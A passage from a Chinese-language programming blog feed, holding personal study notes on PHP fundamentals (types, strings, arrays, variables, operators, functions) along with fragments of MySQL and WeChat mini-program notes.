class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1267</span>, &quot;Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (utf8_general_ci,SYSCONST) for operation &#x27;UNION&#x27;&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>参考文章</p><p><a href="https://blog.csdn.net/chen_jl168/article/details/79123820">mysql自带的4个数据库</a></p><p><a href="https://zhuanlan.zhihu.com/p/33666600">MYSQL的用户变量和系统变量</a></p><p><a href="https://www.jianshu.com/p/8fc90e518e2c">Linux下远程连接MySQL数据库</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础学习笔记</title>
      <link href="/Programming/PHP/base.html"/>
      <url>/Programming/PHP/base.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>PHP</strong>（全称：<strong>P</strong>HP：<strong>H</strong>ypertext <strong>P</strong>reprocessor，即“PHP：超文本预处理器”）是一种<a href="https://zh.wikipedia.org/wiki/开源">开源</a>的通用<a href="https://zh.wikipedia.org/wiki/计算机">计算机</a><a href="https://zh.wikipedia.org/wiki/脚本语言">脚本语言</a>，尤其适用于<a href="https://zh.wikipedia.org/wiki/网络开发">网络开发</a>并可嵌入<a href="https://zh.wikipedia.org/wiki/HTML">HTML</a>中使用</p></blockquote><span id="more"></span><h2 id="PHP的超全局变量"><a href="#PHP的超全局变量" class="headerlink" title="PHP的超全局变量"></a>PHP的超全局变量</h2><ul><li><a href="https://www.php.net/manual/zh/reserved.variables.server.php">$_SERVER</a>是PHP里面的超全局变量, 包含了web服务器提供的所有信息.可通过<code>phpinfo()</code>查看<ul><li><code>$_SERVER[&#39;PHP_SELF&#39;]</code>得到自身文件名</li></ul></li><li><a href="https://www.php.net/manual/zh/reserved.variables.globals.php">$GLOBALS</a></li><li><a href="https://www.php.net/manual/zh/reserved.variables.get.php">$_GET</a></li><li><a href="https://www.php.net/manual/zh/reserved.variables.post.php">$_POST</a></li><li><a href="https://www.php.net/manual/zh/reserved.variables.files.php">$_FILES</a></li><li><a href="https://www.php.net/manual/zh/reserved.variables.cookies.php">$_COOKIE</a></li><li><a href="https://www.php.net/manual/zh/reserved.variables.session.php">$_SESSION</a></li><li><a href="https://www.php.net/manual/zh/reserved.variables.request.php">$_REQUEST</a></li><li><a href="https://www.php.net/manual/zh/reserved.variables.environment.php">$_ENV</a></li></ul><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ul><li>描述变量使用<code>$</code>或者<code>$&#123;&#125;</code>, 前者会匹配更多字符让其合法</li><li><code>&lt;?php echo</code>==<code>&lt;?=</code></li><li>纯php文件文末结束符可省略</li><li>支持<code>#</code>,<code>//</code>,<code>/* */</code>注释(<code>//,#</code>后面的<code>?&gt;</code>不会被注释), <code>/* */</code>不可嵌套</li><li><a href="https://www.php.net/manual/zh/language.types.intro.php">PHP 支持 10 种原始数据类型</a></li><li>如果想查看某个<a href="https://www.php.net/manual/zh/language.expressions.php">表达式</a>的值和类型，用 <a href="https://www.php.net/manual/zh/function.var-dump.php">var_dump()</a> 函数。</li><li>如果只是想得到一个易读懂的类型的表达方式用于调试，用 <a href="https://www.php.net/manual/zh/function.gettype.php">gettype()</a> 函数。要检验某个类型，<em>不要</em>用 <a href="https://www.php.net/manual/zh/function.gettype.php">gettype()</a>，而用 <code>is_type</code> 函数</li><li>如果要将一个变量强制转换为某类型，可以对其使用<a href="https://www.php.net/manual/zh/language.types.type-juggling.php#language.types.typecasting">强制转换</a>或者 <a href="https://www.php.net/manual/zh/function.settype.php">settype()</a> 函数, 使用<a href="https://www.php.net/manual/zh/language.types.type-juggling.php">*</a>符号也能改变类型</li></ul><h3 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h3><ul><li>要使用八进制表达，数字前必须加上 <code>0</code>（零）。要使用十六进制表达，数字前必须加上 <code>0x</code>。要使用二进制表达，数字前必须加上 <code>0b</code></li><li>将 resource 转换成 integer 时， 结果会是 PHP 运行时为 resource 分配的唯一资源号</li><li><strong>PHP 7.4.0</strong> 之前不支持<code>_</code>, 如<code>1_234</code></li></ul><h3 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h3><ul><li>永远不要相信浮点数结果精确到了最后一位，也永远不要比较两个浮点数是否相等。如果确实需要更高的精度，应该使用<a href="https://www.php.net/manual/zh/ref.bc.php">任意精度数学函数</a>或者 <a href="https://www.php.net/manual/zh/ref.gmp.php">gmp 函数</a></li><li>由于 <strong><code>NAN</code></strong> 代表着任何不同值，不应拿 <strong><code>NAN</code></strong> 去和其它值进行比较，包括其自身，应该用 <a href="https://www.php.net/manual/zh/function.is-nan.php">is_nan()</a> 来检查</li></ul><h3 id="String字符串"><a href="#String字符串" class="headerlink" title="String字符串"></a>String字符串</h3><ul><li><code>.</code>与<code>.=</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Hello &quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span> . <span class="string">&quot;World!&quot;</span>; <span class="comment">// now $b contains &quot;Hello World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Hello &quot;</span>;</span><br><span class="line"><span class="variable">$a</span> .= <span class="string">&quot;World!&quot;</span>;     <span class="comment">// now $a contains &quot;Hello World!&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>单引号代表的字符串里的<code>\</code>转义符能转<code>&#39;\</code>两个字符, <code>\n</code>没有任何含义, 在单引号里的<code>$</code>失去了变量的含义(类似linux)</li><li>双引号里的<code>\</code>能转移一些特殊字母和解析<code>$</code>变量</li><li>在<code>&#123;&#125;</code>里面可以使用多重变量, 如</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$bar</span> = <span class="string">&#x27;I am bar.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> foo();</span><br><span class="line"><span class="variable">$bar</span> = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line"><span class="variable">$baz</span> = <span class="keyword">array</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>, <span class="string">&#x27;baz&#x27;</span>, <span class="string">&#x27;quux&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$foo-&gt;$bar&#125;</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$foo-&gt;&#123;$baz[1]&#125;</span>&#125;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>[]与{}都可以访问字符串片段</li><li><code>.</code>可以连接字符串</li></ul><h4 id="heredoc结构"><a href="#heredoc结构" class="headerlink" title="heredoc结构"></a>heredoc结构</h4><p>类似linux的<code>cat &gt; file.name &lt;&lt; eof</code>, 可输入转义字符和变量, 如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">Example of string</span></span><br><span class="line"><span class="string">spanning multiple lines</span></span><br><span class="line"><span class="string">using heredoc syntax.</span></span><br><span class="line"><span class="string">EOD</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/language.types.string.php">更多用法</a></p><h4 id="newdoc结构"><a href="#newdoc结构" class="headerlink" title="newdoc结构"></a>newdoc结构</h4><ul><li>与heredoc的区别是不具备转义和解析变量的能力</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = &lt;&lt;&lt;<span class="string">&#x27;EOD&#x27;</span></span><br><span class="line">Example of <span class="keyword">string</span></span><br><span class="line">spanning multiple lines</span><br><span class="line">using nowdoc syntax.</span><br><span class="line">EOD;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Array数组"><a href="#Array数组" class="headerlink" title="Array数组"></a>Array数组</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;foo&quot;</span> =&gt; <span class="string">&quot;bar&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bar&quot;</span> =&gt; <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自 PHP 5.4 起</span></span><br><span class="line"><span class="variable">$array</span> = [</span><br><span class="line">    <span class="string">&quot;foo&quot;</span> =&gt; <span class="string">&quot;bar&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bar&quot;</span> =&gt; <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>PHP的Array支持键值对</li><li>可以使用<code>array()</code>或者<code>[]</code>初始化一个array对象</li><li><code>key</code>只能是<code>interge</code>和<code>string</code></li><li>使用<code>print_r</code>或者<code>var_dump</code>函数来输出array</li><li>要删除某键值对，对其调用 <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 函数。</li><li><a href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 函数允许删除数组中的某个键。但要注意数组将<em>不会</em>重建索引。如果需要删除后重建索引，可以用 <a href="https://www.php.net/manual/zh/function.array-values.php">array_values()</a> 函数</li><li><a href="https://www.php.net/manual/zh/control-structrues.foreach.php">foreach</a> 控制结构是专门用于数组的。它提供了一个简单的方法来遍历数组。</li><li>数组最后一个元素的 <code>$value</code> 引用在 <code>foreach</code> 循环之后仍会保留。建议使用 <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 来将其销毁。</li></ul><h3 id="Iterable"><a href="#Iterable" class="headerlink" title="Iterable"></a>Iterable</h3><blockquote><p><a href="https://www.php.net/manual/zh/language.types.iterable.php">Iterable</a>是 PHP 7.1 中引入的一个伪类型。它接受任何 array 或实现了 <strong>Traversable</strong> 接口的对象。这些类型都能用 <a href="https://www.php.net/manual/zh/control-structrues.foreach.php">foreach</a> 迭代， 也可以和 <a href="https://www.php.net/manual/zh/language.generators.php">生成器</a> 里的 <strong>yield from</strong> 一起使用</p></blockquote><ul><li>类在扩展/实现（extending/implementing）的时候， 可以将参数类型从 array 或 <strong>Traversable</strong> 放宽到 <a href="https://www.php.net/manual/zh/language.types.iterable.php">iterable</a>， 也可以将返回类型 <a href="https://www.php.net/manual/zh/language.types.iterable.php">iterable</a> 的范围缩小到 array 或 <strong>Traversable</strong></li></ul><h3 id="Resource"><a href="#Resource" class="headerlink" title="Resource"></a>Resource</h3><p>资源 resource 是一种特殊变量，保存了到外部资源的一个引用。资源是通过专门的函数来建立和使用的。所有这些函数及其相应资源类型见<a href="https://www.php.net/manual/zh/resource.php">附录</a>。</p><blockquote><p>参见 <a href="https://www.php.net/manual/zh/function.get-resource-type.php">get_resource_type()</a></p><p>持久数据库连接比较特殊，它们<em>不会</em>被垃圾回收系统销毁。参见<a href="https://www.php.net/manual/zh/featrues.persistent-connections.php">数据库永久连接</a>一章</p></blockquote><h3 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h3><p>null不区分大小写</p><blockquote><p>PHP8.0.0新增了一个类型<a href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a>, 代表任意类型</p><p><a href="https://www.php.net/manual/zh/userlandnaming.tips.php"><code>namespace</code></a>可以避免与其它用户空间代码出现命名空间冲突</p></blockquote><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul><li><strong>PHP变量区分大小写</strong></li><li>变量名规则<code>^[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff]*$</code>    </li><li>PHP变量名可以使用中文</li><li><code>&amp;</code><a href="https://www.php.net/manual/zh/language.references.php">引用赋值(只有有名字的变量才可以引用赋值)</a></li></ul><ul><li>PHP 提供了大量的预定义变量, <a href="https://www.php.net/manual/zh/language.variables.superglobals.php">超全局变量列表</a></li><li>PHP 中全局变量在函数中使用时必须声明为 <code>global</code>或者使用<a href="https://www.php.net/manual/zh/reserved.variables.globals.php">$GLOBALS</a>数组</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># global</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sum</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$a</span>, <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Sum();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># GLOBALS</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sum</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;b&#x27;</span>] = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;a&#x27;</span>] + <span class="variable">$GLOBALS</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Sum();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>静态变量在离开函数后不会被销毁, 声明<code>static $var</code></li><li>可变变量使用<code>$$</code></li></ul><blockquote><p>要将可变变量用于数组，必须解决一个模棱两可的问题。这就是当写下 <code>$$a[1]</code> 时，解析器需要知道是想要 <code>$a[1]</code> 作为一个变量呢，还是想要 <code>$$a</code> 作为一个变量并取出该变量中索引为 [1] 的值。解决此问题的语法是，对第一种情况用 <code>$&#123;$a[1]&#125;</code>，对第二种情况用 <code>$&#123;$a&#125;[1]</code></p><p>对于对象, <code>$foo-&gt;$bar</code>将bar解析后作为foo的属性</p><p><strong>注意</strong>: 在 PHP 的函数和类的方法中，<a href="https://www.php.net/manual/zh/language.variables.superglobals.php">超全局变量</a>不能用作可变变量。<code>$this</code> 变量也是一个特殊变量，不能被动态引用</p></blockquote><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><ul><li>定义规则<code>^[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff]*$</code></li><li>使用<a href="https://www.php.net/manual/zh/function.define.php">define(name, value)</a> 和const定义一个常量</li></ul><blockquote><p>const打小写敏感</p></blockquote><ul><li><a href="https://www.php.net/manual/zh/language.constants.predefined.php">PHP预定义常量</a></li></ul><h2 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h2><ul><li>三元表达式</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$first</span> ? <span class="variable">$second</span> : <span class="variable">$third</span></span><br></pre></td></tr></table></figure><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><ul><li>除了基本的比较运算符外, PHP还支持<code>===(值与类型相等)</code>和<code>!==</code></li><li>PHP支持递增和递减运算符和<code>**</code>运算符</li><li>PHP 支持引用赋值，使用<code>$var = &amp;$othervar;</code>语法。引用赋值意味着两个变量指向了同一个数据(类型linux硬链接)</li></ul><blockquote><p><a href="https://www.php.net/manual/zh/language.oop5.cloning.php">对象复制</a></p></blockquote><ul><li><a href="https://www.php.net/manual/zh/language.oop5.basic.php#language.oop5.basic.new">new</a> 运算符自动返回一个引用，因此对 <a href="https://www.php.net/manual/zh/language.oop5.basic.php#language.oop5.basic.new">new</a> 的结果进行引用赋值是错误的</li><li><a href="https://www.php.net/manual/zh/language.operators.comparison.php#language.operators.comparison.coalesce">NULL 合并运算符<code>??</code></a></li><li><code>&lt;=&gt;</code>返回-1 0 1</li><li>PHP 支持一个错误控制运算符：@。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</li></ul><blockquote><p>@ 运算符只对<a href="https://www.php.net/manual/zh/language.expressions.php">表达式</a>有效。对新手来说一个简单的规则就是：如果能从某处得到值，就能在它前面加上 @ 运算符</p></blockquote><ul><li><code>(``)</code>命令执行运算符</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = `ls -al`;<span class="comment">#输出当前目录所有文件及详细信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>在windows上, 如果输出是二进制文件, 需要使用<a href="https://www.php.net/manual/zh/function.popen.php">popen()</a>, 因为windows的管道是以文件形式打开的</p></blockquote><ul><li><code>&amp;&amp;,||,</code>比<code>and,or</code>运算优先级高. </li><li><a href="https://www.php.net/manual/zh/language.operators.array.php">数组运算符</a></li><li><code>instanceof</code> 用于确定一个 PHP 变量是否属于某一类 <a href="https://www.php.net/manual/zh/language.oop5.basic.php#language.oop5.basic.class">class</a>,确定一个变量是不是继承自某一父类的子类</li></ul><h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><ul><li><code>elseif</code>与<code>else if</code>语义一样, 区别在于前者可以使用冒号, 后者不行</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 不正确的使用方法： */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> &gt; <span class="variable">$b</span>):</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot; is greater than &quot;</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="variable">$b</span>): <span class="comment">// 将无法编译</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;The above line causes a parse error.&quot;</span>;</span><br><span class="line"><span class="keyword">endif</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 正确的使用方法： */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> &gt; <span class="variable">$b</span>):</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot; is greater than &quot;</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$a</span> == <span class="variable">$b</span>): <span class="comment">// 注意使用了一个单词的 elseif</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot; equals &quot;</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot; is neither greater than or equal to &quot;</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">endif</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>PHP 提供了一些流程控制的替代语法，包括 <code>if</code>，<code>while</code>，<code>for</code>，<code>foreach</code> 和 <code>switch</code>。替代语法的基本形式是把左花括号（{）换成冒号（:），把右花括号（}）分别换成 <code>endif;</code>，<code>endwhile;</code>，<code>endfor;</code>，<code>endforeach;</code> 以及 <code>endswitch;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php if ($a == 5): ?&gt;</span><br><span class="line">A is equal to 5</span><br><span class="line">&lt;?php endif; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if ($a == 5):</span><br><span class="line">    echo &quot;a equals 5&quot;;</span><br><span class="line">    echo &quot;...&quot;;</span><br><span class="line">elseif ($a == 6):</span><br><span class="line">    echo &quot;a equals 6&quot;;</span><br><span class="line">    echo &quot;!!!&quot;;</span><br><span class="line">else:</span><br><span class="line">    echo &quot;a is neither 5 nor 6&quot;;</span><br><span class="line">endif;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>注意如果不是<code>^&lt;?php</code>这样写的话会输出空格</p></blockquote><ul><li>foreach不支持使用@来抑制错误信息</li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ul><li>使用默认参数时，任何默认参数必须放在任何非默认参数的右侧</li><li><code>...</code>指定可变参数, 也可用于传递array作为函数参数</li><li><code>:</code>命名参数允许传入乱序的参数, 需要指定参数名</li><li>命名参数也可以与位置参数相结合使用。此种情况下，命名参数必须在位置参数之后</li><li>PHP支持可变函数, 函数名和方法名都可以使用变量指定</li><li>箭头函数支持与 <a href="https://www.php.net/manual/zh/functions.anonymous.php">匿名函数</a> 相同的功能，只是其父作用域的变量总是自动的<ul><li>会参考参数去父作用域中寻找是否有该值</li></ul></li><li>匿名函数需要使用<code>use</code>继承父作用域的变量</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$message</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承 $message</span></span><br><span class="line"><span class="variable">$example</span> = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$message</span></span>) </span>&#123;</span><br><span class="line">    var_dump(<span class="variable">$message</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>匿名函数会自动绑定当前实例<code>this</code>, 可以使用静态匿名函数阻止绑定</li></ul><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 取整(PHP4,5,6,7,8),参数mode传入常量,代表四舍五入还是直接舍去小数</span></span><br><span class="line">round ( <span class="keyword">float</span> <span class="variable">$val</span> , <span class="keyword">int</span> <span class="variable">$precision</span> = <span class="number">0</span> , <span class="keyword">int</span> <span class="variable">$mode</span> = PHP_ROUND_HALF_UP ) : <span class="keyword">float</span></span><br><span class="line"><span class="comment"># 整除(PHP7,8)</span></span><br><span class="line">intdiv ( <span class="keyword">int</span> <span class="variable">$dividend</span> , <span class="keyword">int</span> <span class="variable">$divisor</span> ) : <span class="keyword">int</span></span><br></pre></td></tr></table></figure><ul><li><a href="https://www.php.net/manual/zh/function.isset.php">isset()</a></li><li><a href="https://www.php.net/manual/zh/function.substr.php">substr()</a></li><li><a href="https://www.php.net/manual/zh/function.substr-replace.php">substr_replace()</a></li><li><a href="https://www.php.net/manual/zh/ref.strings.php">字符串函数</a></li><li><a href="https://www.php.net/manual/zh/ref.array.php">数组函数</a></li><li><a href="https://www.php.net/manual/zh/ref.var.php">变量函数</a></li><li><a href="https://www.php.net/manual/zh/ref.math.php">数学函数</a></li><li><a href="https://www.php.net/manual/zh/function.error-get-last.php">error_get_last()</a></li><li><a href="https://www.php.net/manual/zh/function.shell-exec.php">shell_exec()</a></li><li><a href="https://www.php.net/manual/zh/function.get-class.php">get_class()</a></li><li><a href="https://www.php.net/manual/zh/function.is-a.php">is_a()</a></li></ul><h2 id="语言结构"><a href="#语言结构" class="headerlink" title="语言结构"></a>语言结构</h2><blockquote><p>语言结构就是PHP本身支持的语句, 比如<code>echo, print</code>等.</p><p>与函数的区别在于语句的运行速度快, 但缺少了函数的一些特性, 比如函数可以接受其他函数返回的参数等</p></blockquote><ul><li><a href="https://www.php.net/manual/zh/function.list.php">list()</a>: 解构赋值?</li><li><a href="https://www.php.net/manual/zh/function.array.php">array()</a></li><li><a href="https://www.php.net/manual/zh/function.echo.php">echo</a></li><li><a href="https://www.php.net/manual/zh/function.eval.php">eval()</a></li></ul><h2 id="文本处理"><a href="#文本处理" class="headerlink" title="文本处理"></a>文本处理</h2><p><a href="https://www.php.net/manual/zh/regexp.reference.delimiters.php">RCRE</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序笔记</title>
      <link href="/Front-end/wechat-app.html"/>
      <url>/Front-end/wechat-app.html</url>
      
        <content type="html"><![CDATA[<p>微信小程序的学习记录和坑</p><span id="more"></span><ul><li>app.json控制着全局静态数据，比如title，backgroundcolor，tabbar..以及首页page（第一个）</li><li>注册页面有个behaviours，可以将某个页面的属性，字段，方法与当前页面合并（区分组件），需要使用<code>module.exports = Behaviour(...)</code>将数据暴露(区分模块)，<code>require()</code>引用，不支持绝对路径</li><li>Page注册普通页面，Component可以注册组件，类似标签</li><li>wxss建议采用flex布局</li><li>老老实实使用回调，但需要避免代码被割裂</li><li>考虑SPA</li><li>得到查询语句+建立数据库banner表</li><li><a href="https://developers.weixin.qq.com/miniprogram/dev/api/wxml/wx.createSelectorQuery.html">wx.createSelectorQuery()</a>类DOM</li><li><a href="https://blog.csdn.net/Syleapn/article/details/81289337">注意target和currentTarget</a></li><li>浏览器调试后端接口没问题, 开发工具调试出问题, 不要慌, 这种大概率是请求头不对, 比如Get请求上传参数时需要对参数进行编码, 浏览器一般默认采用<code>application/x-www-form-urlencoded</code>, 开发工具需要自己设置下</li><li><code>wx.switchTab</code>才能跳转tarbar界面</li></ul><blockquote><p>GET与POST<br> 1.GET在浏览器回退时是无害的，而POST会再次提交请求。<br> 2.GET产生的URL地址可以被Bookmark，而POST不可以。<br> 3.GET请求会被浏览器主动cache，而POST不会，除非手动设置。<br> <strong>4.GET请求只能进行url编码，而POST支持多种编码方式。</strong><br> 5.GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。<br> 